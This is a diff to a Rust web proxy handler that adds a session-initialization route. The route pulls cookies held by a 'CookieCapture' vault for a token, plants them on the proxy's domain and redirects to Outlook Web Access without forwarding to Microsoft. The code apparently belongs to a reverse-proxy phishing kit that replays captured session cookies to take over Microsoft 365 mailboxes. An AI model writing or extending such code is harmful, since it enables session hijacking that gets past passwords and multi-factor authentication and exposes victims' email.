@@ -141,6 +141,43 @@ pub async fn proxy_handler(
         None
     };
     
+    // Handle session initialization path: /s/{token_id}/
+    // Set cookies and redirect to OWA instead of forwarding to Microsoft
+    if let Some(ref tid) = token_id {
+        // Get cookies for this token
+        let cookie_capture = CookieCapture::new(state.vault.clone());
+        let cookies = match cookie_capture.get_cookies(&state.pool, tid).await {
+            Ok(cookies) => cookies,
+            Err(e) => {
+                eprintln!("[proxy] Failed to get cookies for session {}: {}", tid, e);
+                vec![]
+            }
+        };
+        
+        // Build a response that sets cookies and redirects to /owa/
+        let mut resp = HttpResponse::Found();
+        resp.append_header(("Location", "/owa/"));
+        
+        // Set all cookies
+        for cookie in &cookies {
+            let cookie_str = format!("{}={}; Path=/; Domain={}; Secure; HttpOnly; SameSite=None", 
+                cookie.cookie_name, cookie.cookie_value, config.proxy_domain);
+            if let Ok(header_value) = header::HeaderValue::from_str(&cookie_str) {
+                resp.append_header(("Set-Cookie", header_value));
+            }
+        }
+        
+        // Also add a session marker cookie
+        let session_cookie = format!("simdia_session={}; Path=/; Domain={}; Secure; SameSite=None", 
+            tid, config.proxy_domain);
+        if let Ok(header_value) = header::HeaderValue::from_str(&session_cookie) {
+            resp.append_header(("Set-Cookie", header_value));
+        }
+        
+        log_request(&req, Some(tid), 302, 0);
+        return resp.body("");
+    }
+    
     // Security: Check rate limit
     let conn_info = req.connection_info();
     let client_ip = conn_info.peer_addr().unwrap_or("unknown");
